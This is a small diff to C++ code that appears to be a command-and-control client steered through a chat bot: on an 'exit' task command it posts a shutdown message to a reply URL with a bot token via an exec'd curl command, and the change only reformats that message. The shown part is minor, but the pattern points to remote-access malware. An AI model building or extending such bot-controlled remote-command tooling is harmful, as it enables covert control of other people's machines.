@@ -61,7 +61,7 @@ int main() {
 
                     if (task_cmd == "exit" || task_cmd == "quit") {
                         cout << "[!] Exit command received. Shutting down.\n";
-                        string exit_cmd = "curl -s -X POST -H \"Authorization: Bot " + BOT_TOKEN + "\" -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"[!] Command received. Client shutting down...\\\"}\" \"" + reply_url + "\"";
+                        string exit_cmd = "curl -s -X POST -H \"Authorization: Bot " + BOT_TOKEN + "\" -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"```Command received. Client shutting down...```\\\"}\" \"" + reply_url + "\"";
                         exec(exit_cmd);
                         break;
                     }
